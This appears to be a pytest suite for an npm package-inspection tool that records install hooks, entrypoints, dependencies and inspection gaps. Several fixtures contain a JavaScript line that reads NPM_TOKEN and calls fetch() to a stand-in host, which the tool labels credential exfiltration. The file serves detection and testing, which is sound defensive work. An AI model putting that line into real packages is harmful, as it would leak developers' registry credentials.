from __future__ import annotations

import json
from pathlib import Path

import pytest

from ca9.analyzers.package_code import MAX_TEXT_BYTES
from ca9.artifacts.model import ArtifactFile, ArtifactSnapshot
from ca9.core.models import Artifact, Package
from ca9.review.behavior import BehaviorFact, inspect_snapshot


def _snapshot(
    root: Path,
    *,
    manifest: object | None = None,
    files: dict[str, str | bytes] | None = None,
    version: str = "1.0.0",
    name: str = "example",
    metadata: dict | None = None,
) -> ArtifactSnapshot:
    root.mkdir(parents=True, exist_ok=True)
    contents = {
        "package/package.json": json.dumps(
            manifest if manifest is not None else {"name": name, "version": version}
        )
    }
    contents.update(files or {})
    artifact_files = []
    for relative_path, content in contents.items():
        raw = content.encode() if isinstance(content, str) else content
        path = root / relative_path
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(raw)
        artifact_files.append(ArtifactFile(relative_path, path, len(raw)))
    artifact = Artifact(
        "npm-tarball", "https://registry.npmjs.org/example/-/example.tgz", "sha512-example"
    )
    package = Package(name, version, "npm", artifacts=(artifact,), metadata=metadata or {})
    return ArtifactSnapshot(package, artifact, root / "archive.tgz", root, tuple(artifact_files))


def _facts(snapshot: ArtifactSnapshot) -> dict[tuple[str, str], BehaviorFact]:
    return {(fact.kind, fact.key): fact for fact in inspect_snapshot(snapshot).facts}


def test_lifecycle_hooks_are_individual_comparable_facts(tmp_path: Path) -> None:
    old = _snapshot(tmp_path / "base")
    new = _snapshot(
        tmp_path / "head",
        manifest={
            "name": "example",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "node setup.js",
                "prepare": "node build.js",
                "test": "node test.js",
            },
        },
        files={"package/setup.js": "void 0;", "package/build.js": "void 0;"},
    )

    assert not any(fact.kind == "lifecycle_script" for fact in _facts(old).values())
    facts = _facts(new)
    hook = facts[("lifecycle_script", "postinstall")]
    assert hook.value == {"command": "node setup.js", "execution": "npm_install"}
    assert hook.action == "review"
    assert facts[("lifecycle_script", "prepare")].value == {
        "command": "node build.js",
        "execution": "declared_prepare",
    }
    assert ("lifecycle_script", "test") not in facts


def test_install_exec_rule_keeps_existing_action(tmp_path: Path) -> None:
    snapshot = _snapshot(
        tmp_path,
        manifest={
            "name": "example",
            "version": "1.0.0",
            "scripts": {"install": 'node --eval "0"'},
        },
    )
    assert _facts(snapshot)[("lifecycle_script", "install")].action == "block"


def test_observations_ignore_version_lines_comments_and_spacing(tmp_path: Path) -> None:
    base = _snapshot(
        tmp_path / "base",
        files={
            "package/index.js": 'const token=process.env.NPM_TOKEN; fetch("https://example.invalid/status");',
        },
    )
    head = _snapshot(
        tmp_path / "head",
        version="1.1.0",
        files={
            "package/index.js": '\n// Formatting only.\nconst token = process . env . NPM_TOKEN;\n\nfetch(\n "https://example.invalid/status"\n);\n',
        },
    )
    base_profile = inspect_snapshot(base)
    head_profile = inspect_snapshot(head)

    assert not base_profile.issues and not head_profile.issues
    assert base_profile.facts == head_profile.facts
    assert any(fact.kind == "code_observation" for fact in base_profile.facts)


def test_unrelated_statement_edit_does_not_change_risk_observation(tmp_path: Path) -> None:
    source = 'const token = process.env.NPM_TOKEN; fetch("https://example.invalid/status");\n'
    base = _snapshot(tmp_path / "base", files={"package/index.js": source + "const harmless=1;"})
    head = _snapshot(tmp_path / "head", files={"package/index.js": source + "const harmless=2;"})
    assert _facts(base) == _facts(head)


def test_relevant_literal_changes_change_observation(tmp_path: Path) -> None:
    source = 'const token = process.env.NPM_TOKEN; fetch("https://example.invalid/{path}");'
    base = _snapshot(tmp_path / "base", files={"package/index.js": source.replace("{path}", "one")})
    head = _snapshot(tmp_path / "head", files={"package/index.js": source.replace("{path}", "two")})
    key = ("code_observation", "npm-credential-exfiltration:index.js")
    assert _facts(base)[key].value != _facts(head)[key].value


def test_repeated_observation_is_not_lost(tmp_path: Path) -> None:
    source = 'const token = process.env.NPM_TOKEN; fetch("https://example.invalid/status");'
    base = _snapshot(tmp_path / "base", files={"package/index.js": source})
    head = _snapshot(
        tmp_path / "head",
        files={"package/index.js": source + '\nfetch("https://example.invalid/health");'},
    )
    key = ("code_observation", "npm-credential-exfiltration:index.js")
    assert _facts(base)[key].value != _facts(head)[key].value


@pytest.mark.parametrize(
    "manifest",
    [[], "string", {"name": "wrong", "version": "1.0.0"}, {"name": "example", "version": "2.0.0"}],
)
def test_untrusted_manifest_yields_no_facts(tmp_path: Path, manifest: object) -> None:
    profile = inspect_snapshot(
        _snapshot(tmp_path, manifest=manifest, files={"package/index.js": "void 0;"})
    )
    assert not profile.facts
    assert profile.issues


@pytest.mark.parametrize(
    "text",
    [
        '{"name":',
        '{"name":"example","version":"1.0.0","scripts":{},"scripts":{"install":"node setup.js"}}',
    ],
)
def test_invalid_and_duplicate_manifest_fields_are_unknown(tmp_path: Path, text: str) -> None:
    profile = inspect_snapshot(_snapshot(tmp_path, files={"package/package.json": text}))
    assert not profile.facts
    assert "Invalid or ambiguous" in profile.issues[0]


def test_two_possible_manifest_roots_are_ambiguous(tmp_path: Path) -> None:
    profile = inspect_snapshot(
        _snapshot(
            tmp_path, files={"package.json": json.dumps({"name": "example", "version": "1.0.0"})}
        )
    )
    assert not profile.facts
    assert "unambiguous" in profile.issues[0]


def test_root_manifest_without_package_prefix_is_supported(tmp_path: Path) -> None:
    snapshot = _snapshot(tmp_path)
    manifest = snapshot.files[0]
    root_file = ArtifactFile("package.json", manifest.path, manifest.size)
    snapshot = ArtifactSnapshot(
        snapshot.package,
        snapshot.artifact,
        snapshot.archive_path,
        snapshot.extract_dir,
        (root_file,),
    )
    assert not inspect_snapshot(snapshot).issues


@pytest.mark.parametrize("target", ["real-package", "@scope/real-package"])
def test_explicit_npm_alias_uses_target_manifest_identity(tmp_path: Path, target: str) -> None:
    snapshot = _snapshot(
        tmp_path,
        name="alias",
        metadata={"requested_specifiers": [f"npm:{target}@^1.0.0"]},
        manifest={"name": target, "version": "1.0.0"},
    )
    assert not inspect_snapshot(snapshot).issues


def test_alias_does_not_accept_installed_name_as_target_identity(tmp_path: Path) -> None:
    snapshot = _snapshot(
        tmp_path, name="alias", metadata={"requested_specifiers": ["npm:real-package@^1.0.0"]}
    )
    assert inspect_snapshot(snapshot).issues


@pytest.mark.parametrize(
    ("filename", "content", "reason"),
    [
        ("index.js", b"\x00code", "binary data"),
        ("index.js", b"\xff", "valid UTF-8"),
        ("addon.node", b"\x00", "Unsupported code or native"),
        ("index.ts", "const x: number = 1;", "Unsupported code or native"),
        ("setup.sh", "true", "Unsupported code or native"),
    ],
)
def test_executable_inspection_gaps_are_explicit(
    tmp_path: Path, filename: str, content: str | bytes, reason: str
) -> None:
    profile = inspect_snapshot(_snapshot(tmp_path, files={f"package/{filename}": content}))
    assert any(reason in issue for issue in profile.issues)


def test_oversized_relevant_file_is_explicit(tmp_path: Path) -> None:
    profile = inspect_snapshot(
        _snapshot(tmp_path, files={"package/index.js": " " * (MAX_TEXT_BYTES + 1)})
    )
    assert any("exceeds text inspection limit" in issue for issue in profile.issues)


def test_noncode_assets_and_typescript_declarations_are_not_gaps(tmp_path: Path) -> None:
    profile = inspect_snapshot(
        _snapshot(
            tmp_path,
            files={
                "package/image.png": b"\x00\xff",
                "package/readme.md": "documentation",
                "package/index.d.ts": "export declare const example: string;",
                "package/index.d.mts": "export declare const example: string;",
                "package/data.json": '{"ordinary": "data"}',
            },
        )
    )
    assert not profile.issues


def test_entrypoints_and_dependency_declarations_are_preserved(tmp_path: Path) -> None:
    snapshot = _snapshot(
        tmp_path,
        manifest={
            "name": "example",
            "version": "1.0.0",
            "main": "lib/index.js",
            "module": "lib/index.mjs",
            "browser": {"./lib/index.js": "./browser.js"},
            "bin": {"example": "bin/cli.js"},
            "exports": {"import": "./lib/index.mjs", "default": "./lib/index.js"},
            "dependencies": {"dep": "^1.0.0"},
            "optionalDependencies": {"opt": "~1.0.0"},
            "peerDependencies": {"peer": ">=1"},
            "devDependencies": {"test": "2"},
            "peerDependenciesMeta": {"peer": {"optional": True}},
            "bundledDependencies": ["dep"],
        },
    )
    facts = _facts(snapshot)
    assert facts[("entrypoint", "main")].value == "lib/index.js"
    assert facts[("entrypoint", "bin")].value == {"example": "bin/cli.js"}
    assert facts[("dependency", "dependencies:dep")].value == "^1.0.0"
    assert facts[("dependency", "peerDependencies:peer")].value == ">=1"
    assert facts[("dependency", "bundledDependencies")].value == ["dep"]


def test_conditional_export_precedence_change_is_visible(tmp_path: Path) -> None:
    manifest = {"name": "example", "version": "1.0.0"}
    base = _snapshot(
        tmp_path / "base",
        manifest=manifest | {"exports": {"import": "./esm.js", "default": "./index.js"}},
    )
    head = _snapshot(
        tmp_path / "head",
        manifest=manifest | {"exports": {"default": "./index.js", "import": "./esm.js"}},
    )
    assert (
        _facts(base)[("entrypoint", "exports")].value
        != _facts(head)[("entrypoint", "exports")].value
    )


def test_implicit_index_entrypoint_matches_explicit(tmp_path: Path) -> None:
    base = _snapshot(tmp_path / "base", files={"package/index.js": "void 0;"})
    head = _snapshot(
        tmp_path / "head",
        manifest={"name": "example", "version": "1.0.0", "main": "index.js"},
        files={"package/index.js": "void 0;"},
    )
    assert _facts(base) == _facts(head)


def test_node_gyp_default_install_is_visible_and_uninspectable(tmp_path: Path) -> None:
    snapshot = _snapshot(tmp_path, files={"package/binding.gyp": "{}"})
    profile = inspect_snapshot(snapshot)
    hook = _facts(snapshot)[("lifecycle_script", "install")]
    assert hook.value == {"command": "node-gyp rebuild", "execution": "implicit_npm_install"}
    assert any("binding.gyp" in issue for issue in profile.issues)


@pytest.mark.parametrize(
    "field,value",
    [
        ("scripts", []),
        ("scripts", {"install": 5}),
        ("dependencies", []),
        ("dependencies", {"dep": False}),
        ("main", 42),
        ("exports", {"default": 42}),
    ],
)
def test_malformed_declarations_are_inspection_gaps(
    tmp_path: Path, field: str, value: object
) -> None:
    snapshot = _snapshot(tmp_path, manifest={"name": "example", "version": "1.0.0", field: value})
    assert inspect_snapshot(snapshot).issues


def test_nested_bundled_manifest_hooks_are_observed(tmp_path: Path) -> None:
    snapshot = _snapshot(
        tmp_path,
        files={
            "package/node_modules/bundled/package.json": json.dumps(
                {"scripts": {"install": "node setup.js"}}
            )
        },
    )
    key = ("lifecycle_script", "node_modules/bundled/package.json:install")
    assert key in _facts(snapshot)


def test_snapshot_inspection_never_executes_package_code(tmp_path: Path) -> None:
    marker = tmp_path / "must-not-exist"
    snapshot = _snapshot(
        tmp_path / "artifact",
        manifest={
            "name": "example",
            "version": "1.0.0",
            "scripts": {"install": "node setup.js"},
        },
        files={
            "package/setup.js": f'require("fs").writeFileSync({json.dumps(str(marker))}, "executed");'
        },
    )
    assert inspect_snapshot(snapshot).facts
    assert not marker.exists()


def test_fact_serialization_is_explicit() -> None:
    assert BehaviorFact("dependency", "dependencies:example", "^1").to_dict() == {
        "kind": "dependency",
        "key": "dependencies:example",
        "value": "^1",
        "action": "info",
    }


@pytest.mark.parametrize(
    "field,value",
    [
        ("main", "missing.js"),
        ("bin", {"example": "bin/missing"}),
        ("exports", {"default": "./missing.js"}),
        ("imports", {"#local": "./missing.js"}),
        ("exports", {"./*": "./missing/*.js"}),
    ],
)
def test_missing_declared_entrypoints_are_incomplete(
    tmp_path: Path, field: str, value: object
) -> None:
    profile = inspect_snapshot(
        _snapshot(
            tmp_path,
            manifest={
                "name": "example",
                "version": "1.0.0",
                field: value,
            },
        )
    )
    assert any("cannot be resolved" in issue for issue in profile.issues)


@pytest.mark.parametrize(
    "main,files,complete",
    [
        ("lib/start", {"package/lib/start.js": "void 0;"}, True),
        ("lib", {"package/lib/index.js": "void 0;"}, True),
        (
            "lib",
            {"package/lib/package.json": '{"main": "start.js"}', "package/lib/start.js": "void 0;"},
            False,
        ),
    ],
)
def test_main_extension_and_directory_resolution(
    tmp_path: Path, main: str, files: dict[str, str], complete: bool
) -> None:
    profile = inspect_snapshot(
        _snapshot(
            tmp_path,
            manifest={
                "name": "example",
                "version": "1.0.0",
                "main": main,
            },
            files=files,
        )
    )
    # Node's package-main resolution loads lib/index.*, not lib/package.json's
    # main field. The nested manifest is inspected separately within its scope.
    assert (not profile.issues) is complete


def test_conditional_wildcard_exports_and_external_imports(tmp_path: Path) -> None:
    profile = inspect_snapshot(
        _snapshot(
            tmp_path,
            manifest={
                "name": "example",
                "version": "1.0.0",
                "exports": {"./*": {"types": "./types/*.d.ts", "default": "./lib/*.js"}},
                "imports": {"#external": "another-package", "#local": "./lib/start.js"},
            },
            files={"package/lib/start.js": "void 0;"},
        )
    )
    assert not profile.issues


def test_declared_json_entrypoint_can_be_an_array(tmp_path: Path) -> None:
    profile = inspect_snapshot(
        _snapshot(
            tmp_path,
            manifest={
                "name": "example",
                "version": "1.0.0",
                "main": "data.json",
            },
            files={"package/data.json": "[1, 2, 3]"},
        )
    )
    assert not profile.issues


def test_extensionless_node_bin_is_inspected(tmp_path: Path) -> None:
    profile = inspect_snapshot(
        _snapshot(
            tmp_path,
            manifest={
                "name": "example",
                "version": "1.0.0",
                "bin": "bin/example",
            },
            files={
                "package/bin/example": '#!/usr/bin/env node\nconst token = process.env.NPM_TOKEN; fetch("https://example.invalid/status");'
            },
        )
    )
    assert not profile.issues
    assert any(fact.kind == "code_observation" for fact in profile.facts)


@pytest.mark.parametrize("suffix", [".mts", ".cts"])
def test_typescript_module_variants_are_gaps(tmp_path: Path, suffix: str) -> None:
    profile = inspect_snapshot(
        _snapshot(tmp_path, files={f"package/index{suffix}": "export const value = 1;"})
    )
    assert any("Unsupported code" in issue for issue in profile.issues)


def test_deeply_nested_manifest_is_bounded(tmp_path: Path) -> None:
    declaration: object = "./index.js"
    for _ in range(70):
        declaration = {"default": declaration}
    profile = inspect_snapshot(
        _snapshot(
            tmp_path,
            manifest={
                "name": "example",
                "version": "1.0.0",
                "exports": declaration,
            },
        )
    )
    assert not profile.facts
    assert any("nesting exceeds" in issue for issue in profile.issues)


def test_nonstring_manifest_name_is_untrusted(tmp_path: Path) -> None:
    profile = inspect_snapshot(_snapshot(tmp_path, manifest={"name": [], "version": "1.0.0"}))
    assert not profile.facts
    assert profile.issues


def test_observation_preview_is_bounded_and_full_digest_detects_later_edits(tmp_path: Path) -> None:
    source = 'const token = process.env.NPM_TOKEN; fetch("https://example.invalid/' + "a" * 1000
    base = _snapshot(tmp_path / "base", files={"package/index.js": source + 'one");'})
    head = _snapshot(tmp_path / "head", files={"package/index.js": source + 'two");'})
    key = ("code_observation", "npm-credential-exfiltration:index.js")
    before, after = _facts(base)[key].value, _facts(head)[key].value
    assert isinstance(before, dict) and isinstance(after, dict)
    assert len(before["evidence_preview"]) <= 480
    assert before["evidence_preview"] == after["evidence_preview"]
    assert before["evidence_sha256"] != after["evidence_sha256"]
